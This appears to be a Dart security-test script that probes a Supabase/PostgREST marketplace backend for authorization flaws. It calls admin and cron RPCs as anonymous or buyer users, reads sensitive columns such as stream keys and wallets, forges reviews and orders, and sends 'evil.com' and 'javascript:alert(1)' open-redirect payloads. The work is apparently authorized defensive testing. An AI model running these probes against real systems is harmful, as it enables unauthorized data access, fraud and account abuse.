import 'dart:io';

import '_rti4.dart';

Future<void> main() async {
  final c = Rti4(loadEnv());
  await c.boot();
  stdout.writeln('boot buyer=${c.buyerId} seller=${c.sellerId} fresh=${c.freshId}');

  // ---- OpenAPI / RPC surface (policy well) ----
  final oa = await c.call(
    'GET',
    '/rest/v1/',
    extra: {'Accept': 'application/openapi+json'},
  );
  final oaJson = oa.json;
  final paths = <String>[];
  if (oaJson is Map && oaJson['paths'] is Map) {
    paths.addAll((oaJson['paths'] as Map).keys.map((e) => e.toString()));
  }
  c.note('disc.openapi', 'openapi paths', paths.length, well: '3');

  final rpcNames = paths
      .where((p) => p.startsWith('/rpc/'))
      .map((p) => p.substring(5))
      .toList();
  final interesting = rpcNames
      .where((n) {
        final l = n.toLowerCase();
        return l.contains('wallet') ||
            l.contains('refund') ||
            l.contains('release') ||
            l.contains('settle') ||
            l.contains('admin') ||
            l.contains('cron') ||
            l.contains('feedback') ||
            l.contains('payout') ||
            l.contains('tip') ||
            l.contains('dispute') ||
            l.contains('set_config') ||
            l.contains('raffle');
      })
      .toList();
  c.note('disc.rpc.interesting', 'rpc names', interesting, well: '3');

  // GUC / set_config
  for (final actor in [
    ['anon', null],
    ['buyer', c.buyerJwt],
  ]) {
    final r = await c.rpc(
      'set_config',
      {'setting': 'batata.raffle_prize_write', 'value': '1', 'is_local': true},
      token: actor[1] as String?,
    );
    c.note('p3.set_config.${actor[0]}', 'rpc set_config', r.brief, well: '3');
    if (r.ok) {
      c.finding(
        id: 'RTI4-P3-SETCONFIG',
        title: 'JWT/anon executa set_config (GUC batata.*)',
        actor: actor[0] as String,
        sev: 'P1',
        well: '3',
        pre: 'PostgREST rpc/set_config',
        request: 'set_config batata.raffle_prize_write=1',
        before: null,
        after: r.brief,
        impact: 'Pode desligar gates SECURITY DEFINER que lêem current_setting.',
        repro: 'POST /rest/v1/rpc/set_config',
      );
    }
  }

  // Cron / auto RPCs as JWT + anon
  const crons = [
    'batata_generate_auto_feedback',
    'batata_release_expired_reservations',
    'batata_expire_pending_orders',
    'batata_process_auto_complete_orders',
    'batata_wallet_payout_tick',
    'batata_livekit_egress_cleanup',
  ];
  for (final fn in [...crons, ...interesting.take(12)]) {
    final anonR = await c.rpc(fn, {});
    final buyR = await c.rpc(fn, {}, token: c.buyerJwt);
    c.note('p4.cron.$fn.anon', fn, anonR.brief, well: '4');
    c.note('p4.cron.$fn.buyer', fn, buyR.brief, well: '4');
    if (anonR.ok || (buyR.ok && buyR.body.contains('true'))) {
      // persistência verificada mais abaixo se for auto_feedback
    }
  }

  // Future p_now auto-feedback
  final future = DateTime.now().toUtc().add(const Duration(days: 400)).toIso8601String();
  final af = await c.rpc(
    'batata_generate_auto_feedback',
    {'p_now': future},
    token: c.buyerJwt,
  );
  c.note('p4.auto_feedback.future', 'auto_feedback p_now', af.brief, well: '4');

  // ---- POÇO 3: views vs base, anon ----
  const hubViews = [
    'hub_products_public',
    'hub_profiles_public',
    'hub_lives_public',
    'hub_live_items_public',
    'hub_live_messages_public',
    'hub_reviews_public',
    'hub_profiles_discovery_public',
    'profiles_directory_public',
    'reviews_public_ratings',
  ];
  for (final v in hubViews) {
    final r = await c.rest('GET', '$v?select=*&limit=3');
    c.note('p3.view.anon.$v', v, '${r.status} n=${r.list.length}', well: '3');
  }

  // Sensitive columns via views / tables
  final sensitiveGets = <List<String>>[
    ['lives', 'id,mux_stream_key,mux_playback_id,status&limit=5'],
    ['lives', 'id,livekit_url,ingress_id&limit=3'],
    ['profiles', 'id,email,phone,iban,stripe_account_id&limit=3'],
    ['wallets', 'id,balance,available_balance,stripe_account_id&limit=5'],
    ['wallet_transactions', 'id,user_id,amount,kind&limit=5'],
    ['orders', 'id,buyer_id,status,stripe_payment_intent_id&limit=3'],
    ['reviews_gerais', 'id,buyer_id,target_id,stars,comment&limit=8'],
    ['reviews', 'id,buyer_id,target_id,order_id,stars&limit=5'],
    ['user_notifications', 'id,user_id,title,body&limit=5'],
    ['products', 'id,title,is_sold,list_on_marketplace,quantity,cost_price&limit=8'],
  ];
  for (final pair in sensitiveGets) {
    final anonR = await c.rest('GET', '${pair[0]}?select=${pair[1]}');
    final buyR =
        await c.rest('GET', '${pair[0]}?select=${pair[1]}', token: c.buyerJwt);
    c.note('p3.anon.${pair[0]}', pair[0], anonR.brief, well: '3');
    c.note('p3.buyer.${pair[0]}', pair[0], buyR.brief, well: '3');

    if (pair[0] == 'lives' && anonR.ok) {
      final keys = anonR.list
          .whereType<Map>()
          .map((m) => m['mux_stream_key'])
          .where((k) => k != null && k.toString().isNotEmpty)
          .toList();
      if (keys.isNotEmpty) {
        c.finding(
          id: 'RTI4-P3-STREAMKEY',
          title: 'anon lê mux_stream_key',
          actor: 'anon',
          sev: 'P1',
          well: '3',
          pre: 'GET lives?select=mux_stream_key',
          request: 'anon GET',
          before: null,
          after: keys.length,
          impact: 'Ingest key pública.',
          repro: 'GET /rest/v1/lives?select=id,mux_stream_key',
        );
      } else {
        c.hold('p3.lives.key', 'anon lives sem stream key', anonR.brief, well: '3');
      }
    }

    if (pair[0] == 'wallets' && buyR.ok) {
      final others = buyR.list.whereType<Map>().where((m) {
        final id = m['id']?.toString();
        return id != null && id != c.buyerId;
      }).toList();
      if (others.isNotEmpty) {
        c.finding(
          id: 'RTI4-P3-WALLET-XUSER',
          title: 'buyer lê wallets alheias',
          actor: 'buyer',
          sev: 'P1',
          well: '3',
          pre: 'GET wallets',
          request: 'buyer JWT',
          before: null,
          after: others.length,
          impact: 'Saldo / Connect de outros UIDs.',
          repro: 'GET /rest/v1/wallets',
        );
      } else {
        c.hold('p3.wallets.own', 'buyer wallets só próprias ou vazio', buyR.brief,
            well: '3');
      }
    }

    if (pair[0] == 'reviews_gerais' && buyR.ok) {
      final others = buyR.list.whereType<Map>().where((m) {
        return m['buyer_id']?.toString() != c.buyerId;
      }).toList();
      if (others.isNotEmpty) {
        // P2 unless comments+ids of strangers are sensitive — Hub view omits buyer_id
        c.finding(
          id: 'RTI4-P3-REVIEWS-GERAIS-UID',
          title: 'JWT lê reviews_gerais.buyer_id de terceiros',
          actor: 'buyer',
          sev: 'P2',
          well: '3',
          pre: 'GET reviews_gerais',
          request: 'buyer JWT',
          before: null,
          after: others.take(3).map((m) => m['buyer_id']).toList(),
          impact: 'UID de autores de reviews Hub (view pública omite).',
          repro: 'GET /rest/v1/reviews_gerais?select=id,buyer_id',
        );
      }
    }
  }

  // Extra columns on hub views (PostgREST error vs data)
  final extraCol = await c.rest(
    'GET',
    'hub_lives_public?select=id,mux_stream_key&limit=1',
  );
  c.note('p3.hub.lives.streamcol', 'hub_lives mux_stream_key', extraCol.brief,
      well: '3');

  // ---- POÇO 1 fixtures ----
  final listed = await c.insertProduct(listed: true, sold: false, qty: 1);
  final unlisted = await c.insertProduct(listed: false, sold: false, qty: 2);
  final sold = await c.insertProduct(listed: true, sold: true, qty: 1);
  final qty0 = await c.insertProduct(listed: true, sold: false, qty: 0);
  final listed2 = await c.insertProduct(listed: true, sold: false, qty: 1);

  if (listed == null || unlisted == null || sold == null) {
    stderr.writeln('FATAL product insert failed');
    await c.dump('pass1');
    exit(2);
  }
  final listedId = listed['id'].toString();
  final unlistedId = unlisted['id'].toString();
  final soldId = sold['id'].toString();
  final qty0Id = qty0?['id']?.toString();

  // Hub vs REST
  final hubUnlisted = await c.rest(
    'GET',
    'hub_products_public?id=eq.$unlistedId&select=id,title,is_sold',
  );
  final hubSold = await c.rest(
    'GET',
    'hub_products_public?id=eq.$soldId&select=id,title,is_sold',
  );
  final restUnlistedAnon = await c.rest(
    'GET',
    'products?id=eq.$unlistedId&select=id,title,price,quantity,is_sold,list_on_marketplace',
  );
  final restUnlistedBuyer = await c.rest(
    'GET',
    'products?id=eq.$unlistedId&select=id,title,price,quantity,is_sold,list_on_marketplace',
    token: c.buyerJwt,
  );
  final restSoldAnon = await c.rest(
    'GET',
    'products?id=eq.$soldId&select=id,title,is_sold,list_on_marketplace,quantity',
  );
  c.note('p1.hub.unlisted', 'hub unlisted', hubUnlisted.brief, well: '1');
  c.note('p1.hub.sold', 'hub sold', hubSold.brief, well: '1');
  c.note('p1.rest.unlisted.anon', 'products unlisted anon', restUnlistedAnon.brief,
      well: '1');
  c.note('p1.rest.unlisted.buyer', 'products unlisted buyer',
      restUnlistedBuyer.brief, well: '1');
  c.note('p1.rest.sold.anon', 'products sold anon', restSoldAnon.brief, well: '1');

  if (hubUnlisted.ok && hubUnlisted.list.isNotEmpty) {
    c.finding(
      id: 'RTI4-P1-HUB-UNLIST',
      title: 'Hub mostra produto unlistado',
      actor: 'anon',
      sev: 'P2',
      well: '1',
      pre: 'product list_on_marketplace=false',
      request: 'GET hub_products_public',
      before: unlisted,
      after: hubUnlisted.brief,
      impact: 'Montra pública inconsistente com unlist.',
      repro: 'seller unlist + GET hub_products_public?id=eq.',
    );
  } else {
    c.hold('p1.hub.unlisted', 'Hub vazio para unlist', hubUnlisted.brief, well: '1');
  }
  if (hubSold.ok && hubSold.list.isNotEmpty) {
    c.finding(
      id: 'RTI4-P1-HUB-SOLD',
      title: 'Hub mostra produto is_sold',
      actor: 'anon',
      sev: 'P2',
      well: '1',
      pre: 'is_sold=true listed',
      request: 'GET hub_products_public',
      before: sold,
      after: hubSold.brief,
      impact: 'Vendidos na vitrine Hub.',
      repro: 'GET hub_products_public is_sold product',
    );
  } else {
    c.hold('p1.hub.sold', 'Hub omite is_sold', hubSold.brief, well: '1');
  }
  if (restUnlistedAnon.ok && restUnlistedAnon.list.isNotEmpty) {
    c.finding(
      id: 'RTI4-P1-REST-UNLIST-ANON',
      title: 'anon lê produto unlistado na tabela products',
      actor: 'anon',
      sev: 'P2',
      well: '1',
      pre: 'unlist',
      request: 'GET products',
      before: unlistedId,
      after: restUnlistedAnon.brief,
      impact: 'Catálogo morto visível fora do Hub.',
      repro: 'GET products?id=eq.unlisted',
    );
  } else {
    c.hold('p1.rest.unlisted.anon', 'anon não lê unlist', restUnlistedAnon.brief,
        well: '1');
  }
  if (restUnlistedBuyer.ok && restUnlistedBuyer.list.isNotEmpty) {
    c.finding(
      id: 'RTI4-P1-REST-UNLIST-BUYER',
      title: 'buyer sem order lê unlist na tabela products',
      actor: 'buyer',
      sev: 'P2',
      well: '1',
      pre: 'buyer JWT sem order neste SKU',
      request: 'GET products unlist',
      before: unlistedId,
      after: restUnlistedBuyer.brief,
      impact: 'Montra morta ainda enumerável autenticado.',
      repro: 'GET products as buyer',
    );
  } else {
    c.hold('p1.rest.unlisted.buyer', 'buyer sem order não lê unlist',
        restUnlistedBuyer.brief, well: '1');
  }

  // Hold INSERT attacks
  Future<void> tryHold({
    required String id,
    required String title,
    required String pid,
    String? liveId,
    String? liveItemId,
    String? liveRaffleId,
    String status = 'reserva_pendente',
    int qty = 1,
    String? token,
    String? buyer,
  }) async {
    final r = await c.insertOrder(
      token: token ?? c.buyerJwt,
      productId: pid,
      buyer: buyer,
      status: status,
      qty: qty,
      liveId: liveId,
      liveItemId: liveItemId,
      liveRaffleId: liveRaffleId,
    );
    c.note(id, title, r.brief, well: '1');
    if (r.ok && r.list.isNotEmpty) {
      final oid = (r.list.first as Map)['id']?.toString();
      if (oid != null) c.createdOrderIds.add(oid);
      final persisted = await c.getOne('orders', oid ?? '',
          select: 'id,status,product_id,live_id,live_item_id,live_raffle_id,quantity');
      c.finding(
        id: id,
        title: title,
        actor: 'buyer JWT',
        sev: 'P1',
        well: '1',
        pre: 'produto morto/montra',
        request: 'POST orders status=$status live=$liveId raffle=$liveRaffleId',
        before: {'product': pid},
        after: persisted,
        impact: 'Hold / venda sobre SKU morto ou unlist.',
        repro: 'POST /rest/v1/orders JWT',
      );
    }
  }

  await tryHold(id: 'RTI4-P1-HOLD-UNLIST', title: 'hold unlistado', pid: unlistedId);
  await tryHold(id: 'RTI4-P1-HOLD-SOLD', title: 'hold is_sold', pid: soldId);
  if (qty0Id != null) {
    await tryHold(id: 'RTI4-P1-HOLD-QTY0', title: 'hold qty=0', pid: qty0Id);
  }

  final fakeLive = '00000000-0000-0000-0000-000000000001';
  await tryHold(
    id: 'RTI4-P1-HOLD-UNLIST-FAKELIVE',
    title: 'unlist + live_id UUID inventado',
    pid: unlistedId,
    liveId: fakeLive,
  );
  await tryHold(
    id: 'RTI4-P1-HOLD-UNLIST-RAFFLE',
    title: 'unlist + live_raffle_id JWT',
    pid: unlistedId,
    liveRaffleId: fakeLive,
  );

  // Non-holding status then upgrade
  final ghost = await c.insertOrder(
    token: c.buyerJwt,
    productId: unlistedId,
    status: 'rascunho',
  );
  c.note('p1.ghost.draft', 'insert status rascunho unlist', ghost.brief, well: '1');
  if (ghost.ok && ghost.list.isNotEmpty) {
    final oid = (ghost.list.first as Map)['id'].toString();
    c.createdOrderIds.add(oid);
    final up = await c.rest(
      'PATCH',
      'orders?id=eq.$oid',
      token: c.buyerJwt,
      body: {'status': 'reserva_pendente'},
    );
    final after = await c.getOne('orders', oid, select: 'id,status,product_id');
    c.note('p1.ghost.upgrade', 'draft→reserva_pendente', up.brief, well: '1');
    if ((after?['status'] ?? '').toString().toLowerCase() == 'reserva_pendente') {
      c.finding(
        id: 'RTI4-P1-DRAFT-UPGRADE',
        title: 'INSERT rascunho em unlist + PATCH para hold',
        actor: 'buyer',
        sev: 'P1',
        well: '1',
        pre: 'unlist + status que não hold',
        request: 'INSERT rascunho; PATCH reserva_pendente',
        before: ghost.brief,
        after: after,
        impact: 'Bypass do gate de hold no INSERT.',
        repro: 'orders INSERT status=rascunho then PATCH',
      );
    } else {
      c.hold('p1.draft.upgrade', 'upgrade bloqueado ou revertido', after, well: '1');
    }
  } else {
    c.hold('p1.draft.insert', 'INSERT rascunho recusado', ghost.brief, well: '1');
  }

  // Ended live from Hub as spoof
  final endedLives = await c.rest(
    'GET',
    'hub_lives_public?is_active=eq.false&select=id,seller_id,status,is_active&limit=5',
  );
  c.note('p1.ended.lives', 'hub ended lives', '${endedLives.list.length}', well: '1');
  if (endedLives.list.isNotEmpty) {
    final L = endedLives.list.first as Map;
    await tryHold(
      id: 'RTI4-P1-HOLD-UNLIST-ENDED-LIVE',
      title: 'unlist + live_id ended Hub',
      pid: unlistedId,
      liveId: L['id']?.toString(),
    );
  }

  // Active live (if any) of THIS seller vs OTHER seller
  final activeLives = await c.rest(
    'GET',
    'lives?or=(is_active.eq.true,status.eq.live)&select=id,seller_id,vendedor_id,status,is_active&limit=10',
    service: true,
  );
  c.note('p1.active.lives', 'active lives svc', '${activeLives.list.length}',
      well: '1');
  Map<String, dynamic>? ownLive;
  Map<String, dynamic>? otherLive;
  for (final row in activeLives.list.whereType<Map>()) {
    final sid = (row['seller_id'] ?? row['vendedor_id'])?.toString();
    if (sid == c.sellerId) {
      ownLive = Map<String, dynamic>.from(row);
    } else {
      otherLive = Map<String, dynamic>.from(row);
    }
  }
  if (ownLive != null) {
    await tryHold(
      id: 'RTI4-P1-HOLD-UNLIST-OWN-LIVE',
      title: 'unlist + live_id activo do próprio seller',
      pid: unlistedId,
      liveId: ownLive['id']?.toString(),
    );
  }
  if (otherLive != null) {
    await tryHold(
      id: 'RTI4-P1-HOLD-UNLIST-FOREIGN-LIVE',
      title: 'unlist + live_id activo de outro seller',
      pid: unlistedId,
      liveId: otherLive['id']?.toString(),
    );
    // spoof seller_id to match foreign live
    final spoof = await c.insertOrder(
      token: c.buyerJwt,
      productId: unlistedId,
      seller: otherLive['seller_id']?.toString() ??
          otherLive['vendedor_id']?.toString(),
      liveId: otherLive['id']?.toString(),
    );
    c.note('p1.spoof.seller.live', 'unlist + seller spoof + foreign live',
        spoof.brief, well: '1');
    if (spoof.ok && spoof.list.isNotEmpty) {
      final oid = (spoof.list.first as Map)['id'].toString();
      c.createdOrderIds.add(oid);
      c.finding(
        id: 'RTI4-P1-SPOOF-SELLER-LIVE',
        title: 'unlist hold com seller_id + live alheios',
        actor: 'buyer',
        sev: 'P1',
        well: '1',
        pre: 'product unlist do lab seller; live activa de outro',
        request: 'POST orders seller_id=live.seller live_id=foreign',
        before: {'product': unlistedId, 'live': otherLive['id']},
        after: spoof.brief,
        impact: 'Bypass unlist via contexto de directo alheio.',
        repro: 'POST orders live_id de outro seller',
      );
    }
  }

  // Edge checkout of dead SKUs (need an order first on listed then mutate product)
  final listedHold = await c.insertOrder(token: c.buyerJwt, productId: listedId);
  c.note('p1.listed.hold', 'control listed hold', listedHold.brief, well: '1');
  String? listedOid;
  if (listedHold.ok && listedHold.list.isNotEmpty) {
    listedOid = (listedHold.list.first as Map)['id'].toString();
    c.createdOrderIds.add(listedOid);
  }

  Future<HttpR> checkout(String oid, {String? token}) {
    return c.edge(
      'create-payment-intent',
      {
        'order_id': oid,
        'product_id': listedId,
        'amount': 4.5,
        'shipping_method': 'Entrega em mão (€0.00)',
      },
      token: token ?? c.buyerJwt,
    );
  }

  if (listedOid != null) {
    final ckOk = await checkout(listedOid);
    c.note('p1.edge.listed', 'checkout listed control', ckOk.brief, well: '1');
  }

  // Unlist after hold then checkout (composition)
  if (listedOid != null) {
    final ul = await c.rest(
      'PATCH',
      'products?id=eq.$listedId',
      token: c.sellerJwt,
      body: {'list_on_marketplace': false},
    );
    c.note('p1.unlist.after.hold', 'seller unlist after hold', ul.brief, well: '1');
    final ck = await c.edge(
      'create-payment-intent',
      {
        'order_id': listedOid,
        'product_id': listedId,
        'amount': 0.01,
        'shipping_method': 'Entrega em mão (€0.00)',
      },
      token: c.buyerJwt,
    );
    c.note('p1.edge.after.unlist', 'checkout after unlist', ck.brief, well: '1');
    final sessionCreated = ck.ok &&
        ((ck.map?['checkoutUrl'] ?? ck.map?['checkoutSessionId'] ?? '')
            .toString()
            .isNotEmpty);
    if (sessionCreated) {
      c.finding(
        id: 'RTI4-P1-EDGE-AFTER-UNLIST',
        title: 'Edge cria Session depois do seller unlistar o SKU holdado',
        actor: 'buyer JWT + Edge',
        sev: 'P2',
        well: '1',
        pre: 'hold enquanto listed; seller unlist',
        request: 'create-payment-intent',
        before: {'order': listedOid, 'product': listedId},
        after: ck.brief,
        impact:
            'SESSION CRIADA (≠ captura). Montra morta ainda gera Checkout. Captura a provar no pass2.',
        repro: 'hold listed → PATCH unlist → create-payment-intent',
      );
    } else {
      c.hold('p1.edge.after.unlist', 'Edge recusa unlist pós-hold', ck.brief,
          well: '1');
    }
    // relist for cleanup of this SKU
    await c.rest(
      'PATCH',
      'products?id=eq.$listedId',
      token: c.sellerJwt,
      body: {'list_on_marketplace': true},
    );
  }

  // Direct Edge with unlisted product_id (no order / alien order)
  final ckUnlisted = await c.edge(
    'create-payment-intent',
    {
      'product_id': unlistedId,
      'amount': 1,
      'shipping_method': 'Entrega em mão (€0.00)',
    },
    token: c.buyerJwt,
  );
  c.note('p1.edge.unlisted.noid', 'edge unlist sem order', ckUnlisted.brief,
      well: '1');

  // Race N parallel holds on qty=1 listed2
  if (listed2 != null) {
    final pid = listed2['id'].toString();
    final futures = List.generate(
      5,
      (_) => c.insertOrder(token: c.buyerJwt, productId: pid, qty: 1),
    );
    final results = await Future.wait(futures);
    final ok = results.where((r) => r.ok && r.list.isNotEmpty).toList();
    for (final r in ok) {
      final id = (r.list.first as Map)['id']?.toString();
      if (id != null) c.createdOrderIds.add(id);
    }
    c.note(
      'p1.race.holds',
      'N=5 holds qty=1',
      'ok=${ok.length} codes=${results.map((e) => e.status).toList()}',
      well: '1',
    );
    if (ok.length >= 2) {
      c.finding(
        id: 'RTI4-P1-RACE-HOLD',
        title: 'qty=1 aceitou ≥2 holds JWT em paralelo',
        actor: 'buyer',
        sev: 'P2',
        well: '1',
        pre: 'quantity=1 listed',
        request: '5 POST orders paralelo',
        before: {'qty': 1},
        after: {'holds': ok.length},
        impact:
            'Dois holds ≠ duas capturas. Oversell económico só se ambas liquidarem.',
        repro: '5x POST orders qty=1',
      );
    } else {
      c.hold('p1.race.hold', '≤1 hold persistido', 'ok=${ok.length}', well: '1');
    }
  }

  // Bundles with sold/unlisted items
  final bundle = await c.rest(
    'POST',
    'product_bundles',
    token: c.buyerJwt,
    body: {
      'seller_id': c.sellerId,
      'buyer_id': c.buyerId,
      'product_ids': [unlistedId, soldId],
      'status': 'accepted',
      'total_eur': 1,
      'discount_percent': 90,
    },
  );
  c.note('p1.bundle.dead.accept', 'buyer self-accept dead bundle', bundle.brief,
      well: '1');
  if (bundle.ok && bundle.list.isNotEmpty) {
    c.finding(
      id: 'RTI4-P1-BUNDLE-DEAD',
      title: 'buyer cria/aceita bundle com SKUs mortos',
      actor: 'buyer',
      sev: 'P1',
      well: '1',
      pre: 'unlisted + is_sold no product_ids',
      request: 'POST product_bundles status=accepted',
      before: [unlistedId, soldId],
      after: bundle.brief,
      impact: 'Contrato de conjunto sobre catálogo morto.',
      repro: 'POST product_bundles',
    );
  } else {
    c.hold('p1.bundle.dead', 'bundle morto recusado', bundle.brief, well: '1');
  }

  // Offers on unlisted
  final offer = await c.rest(
    'POST',
    'product_offers',
    token: c.buyerJwt,
    body: {
      'product_id': unlistedId,
      'buyer_id': c.buyerId,
      'seller_id': c.sellerId,
      'amount': 1,
      'status': 'pending',
      'offered_by': 'buyer',
    },
  );
  c.note('p1.offer.unlist', 'offer unlist', offer.brief, well: '1');

  // ---- POÇO 3: INSERT vs Edge, silent trigger ----
  if (listedOid != null) {
    final patchPago = await c.rest(
      'PATCH',
      'orders?id=eq.$listedOid',
      token: c.buyerJwt,
      body: {'status': 'pago'},
    );
    final afterPago = await c.getOne('orders', listedOid, select: 'id,status');
    c.note('p3.silent.pago', 'buyer PATCH pago',
        '${patchPago.brief} after=${afterPago?['status']}', well: '3');
    if ((afterPago?['status'] ?? '').toString().toLowerCase() == 'pago') {
      c.finding(
        id: 'RTI4-P3-BUYER-PAGO',
        title: 'buyer JWT marca pago sem captura',
        actor: 'buyer',
        sev: 'P0',
        well: '3',
        pre: 'reserva_pendente sem PI',
        request: 'PATCH status=pago',
        before: listedOid,
        after: afterPago,
        impact: 'Estado pago sem Stripe.',
        repro: 'PATCH orders status=pago',
      );
    } else if (patchPago.ok) {
      c.hold('p3.silent.pago', 'HTTP OK mas status não persistiu pago (silent revert)',
          afterPago, well: '3');
    }
  }

  // reviews_gerais INSERT
  final rg = await c.rest(
    'POST',
    'reviews_gerais',
    token: c.buyerJwt,
    body: {
      'buyer_id': c.buyerId,
      'target_id': c.sellerId,
      'target_type': 'seller',
      'stars': 5,
      'comment': '$prefix forged hub review',
    },
  );
  c.note('p3.reviews_gerais.insert', 'INSERT reviews_gerais', rg.brief, well: '3');
  if (rg.ok && rg.list.isNotEmpty) {
    c.finding(
      id: 'RTI4-P3-FORGE-HUB-REVIEW',
      title: 'JWT insere reviews_gerais (Hub)',
      actor: 'buyer',
      sev: 'P1',
      well: '3',
      pre: 'sem order concluido',
      request: 'POST reviews_gerais',
      before: null,
      after: rg.brief,
      impact: 'Reputação Hub forjada; view hub_reviews_public lê esta tabela.',
      repro: 'POST /rest/v1/reviews_gerais',
    );
  } else {
    c.hold('p3.reviews_gerais', 'INSERT reviews_gerais recusado', rg.brief, well: '3');
  }

  final rev = await c.rest(
    'POST',
    'reviews',
    token: c.buyerJwt,
    body: {
      'buyer_id': c.buyerId,
      'target_id': c.sellerId,
      'stars': 5,
      'comment': '$prefix forge',
      'order_id': listedOid,
    },
  );
  c.note('p3.reviews.insert', 'INSERT reviews sem concluido', rev.brief, well: '3');
  if (rev.ok) {
    c.finding(
      id: 'RTI4-P3-FORGE-REVIEW',
      title: 'review sem order concluido',
      actor: 'buyer',
      sev: 'P1',
      well: '3',
      pre: 'order não concluido',
      request: 'POST reviews',
      before: listedOid,
      after: rev.brief,
      impact: 'Reputação forjada.',
      repro: 'POST reviews',
    );
  } else {
    c.hold('p3.reviews', 'review recusada', rev.brief, well: '3');
  }

  // SECURITY DEFINER admin RPC
  final adminRpc = await c.rpc(
    'batata_admin_resolve_dispute',
    {'p_dispute_id': fakeLive, 'p_resolution': 'resolvida', 'p_note': 'x'},
    token: c.buyerJwt,
  );
  final adminAnon = await c.rpc(
    'batata_admin_resolve_dispute',
    {'p_dispute_id': fakeLive, 'p_resolution': 'resolvida', 'p_note': 'x'},
  );
  c.note('p3.admin.buyer', 'admin resolve buyer', adminRpc.brief, well: '3');
  c.note('p3.admin.anon', 'admin resolve anon', adminAnon.brief, well: '3');

  // ---- POÇO 4 orbit ----
  final notif = await c.rest(
    'POST',
    'user_notifications',
    token: c.buyerJwt,
    body: {
      'user_id': c.sellerId,
      'kind': 'probe',
      'title': '$prefix',
      'body': 'cross-user notif',
    },
  );
  c.note('p4.notif.insert', 'notif to seller', notif.brief, well: '4');
  if (notif.ok) {
    c.finding(
      id: 'RTI4-P4-NOTIF-XUSER',
      title: 'buyer INSERT notificação no UID do seller',
      actor: 'buyer',
      sev: 'P2',
      well: '4',
      pre: 'user_notifications',
      request: 'POST user_id=seller',
      before: null,
      after: notif.brief,
      impact: 'Spam / phishing in-app cross-user.',
      repro: 'POST user_notifications',
    );
  } else {
    c.hold('p4.notif', 'INSERT notif recusado', notif.brief, well: '4');
  }

  final fav = await c.rest(
    'POST',
    'favorites',
    token: c.buyerJwt,
    body: {'user_id': c.sellerId, 'product_id': listedId},
  );
  c.note('p4.fav.spoof', 'favorite as seller uid', fav.brief, well: '4');

  final fol = await c.rest(
    'POST',
    'follows',
    token: c.buyerJwt,
    body: {'follower_id': c.sellerId, 'following_id': c.buyerId},
  );
  c.note('p4.follow.spoof', 'follow as seller', fol.brief, well: '4');
  if (fol.ok) {
    c.finding(
      id: 'RTI4-P4-FOLLOW-SPOOF',
      title: 'buyer cria follow com follower_id alheio',
      actor: 'buyer',
      sev: 'P2',
      well: '4',
      pre: 'follows',
      request: 'POST follower_id=seller',
      before: null,
      after: fol.brief,
      impact: 'Atribuição de follow falsa.',
      repro: 'POST follows',
    );
  }

  // Connect origin
  for (final origin in [
    'https://evil.com',
    'https://fleaber.pt.evil.com',
    'https://attacker.fleaber.pt',
    'javascript:alert(1)',
    'https://fleaber.pt/../../../evil',
    'http://fleaber.pt',
    'https://fleaber.pt',
  ]) {
    final r = await c.edge(
      'create-connect-account',
      {'web_return_origin': origin},
      token: c.sellerJwt,
    );
    c.note('p4.connect.origin', origin, r.brief, well: '4');
    final loc = (r.map?['url'] ?? r.map?['onboarding_url'] ?? r.body).toString();
    if (origin.contains('evil') && loc.contains('evil')) {
      c.finding(
        id: 'RTI4-P4-CONNECT-REDIRECT',
        title: 'Connect return origin hostil reflectido',
        actor: 'seller',
        sev: 'P1',
        well: '4',
        pre: 'create-connect-account',
        request: origin,
        before: null,
        after: r.brief,
        impact: 'Open redirect pós-Connect.',
        repro: 'POST create-connect-account web_return_origin',
      );
    }
  }

  // Tips: ended live, amount, bind tip_id
  final tipEnded = await c.rpc(
    'batata_create_live_tip_pending',
    {
      'p_live_id': endedLives.list.isNotEmpty
          ? (endedLives.list.first as Map)['id']
          : fakeLive,
      'p_seller_id': c.sellerId,
      'p_amount': 5,
      'p_stripe_session_id': 'cs_test_forged_$stamp',
    },
    token: c.buyerJwt,
  );
  c.note('p4.tip.ended', 'tip pending ended live', tipEnded.brief, well: '4');

  final tipEdge = await c.edge(
    'create-live-tip-checkout',
    {
      'seller_id': c.sellerId,
      'amount_eur': 5,
      'live_id': fakeLive,
      'tip_id': fakeLive,
      'web_return_origin': 'https://evil.com',
    },
    token: c.buyerJwt,
  );
  c.note('p4.tip.edge.fake', 'tip edge fake live + tip_id', tipEdge.brief, well: '4');

  final tipWallet = await c.rpc(
    'batata_send_live_tip_from_wallet',
    {
      'p_live_id': fakeLive,
      'p_seller_id': c.sellerId,
      'p_amount': 1,
    },
    token: c.buyerJwt,
  );
  c.note('p4.tip.wallet.fake', 'wallet tip fake live', tipWallet.brief, well: '4');

  // Release alien order
  final relAlien = await c.rpc(
    'batata_release_seller_wallet_for_order',
    {'p_order_id': fakeLive},
    token: c.buyerJwt,
  );
  c.note('p4.release.fake', 'release uuid fake', relAlien.brief, well: '4');

  // Fresh buyer cross-user SELECT seller orders
  if (c.freshJwt != null) {
    final xo = await c.rest(
      'GET',
      'orders?seller_id=eq.${c.sellerId}&select=id,buyer_id,status,price_total&limit=5',
      token: c.freshJwt,
    );
    c.note('p3.fresh.orders', 'fresh GET seller orders', xo.brief, well: '3');
    if (xo.ok && xo.list.isNotEmpty) {
      c.finding(
        id: 'RTI4-P3-FRESH-ORDERS',
        title: 'buyer fresco lê orders de outros',
        actor: 'fresh buyer',
        sev: 'P1',
        well: '3',
        pre: 'signup descartável',
        request: 'GET orders?seller_id=',
        before: null,
        after: xo.list.length,
        impact: 'Cross-user orders.',
        repro: 'signup + GET orders',
      );
    }
  }

  // Anon execute interesting DEFINER
  for (final fn in [
    'batata_release_seller_wallet_for_order',
    'batata_settle_order_from_stripe',
    'batata_settle_live_tip_from_stripe',
    'batata_credit_wallet_once',
    'batata_find_user_id_by_email',
  ]) {
    final r = await c.rpc(fn, {'p_order_id': fakeLive, 'p_email': 'a@b.c'});
    c.note('p3.anon.rpc.$fn', fn, r.brief, well: '3');
    if (r.ok && !r.body.contains('false')) {
      // email oracle?
      if (fn.contains('email') && r.body.length > 8 && r.status == 200) {
        c.finding(
          id: 'RTI4-P3-EMAIL-ORACLE',
          title: 'anon resolve email→UUID',
          actor: 'anon',
          sev: 'P2',
          well: '3',
          pre: fn,
          request: 'rpc',
          before: null,
          after: r.brief,
          impact: 'Oracle de contas (núcleo rate-limit residual se 200).',
          repro: 'POST rpc/$fn',
        );
      }
    }
  }

  await c.dump('pass1');
  stdout.writeln(
      'PASS1 done findings=${c.findings.length} holds=${c.holds.length}');
}
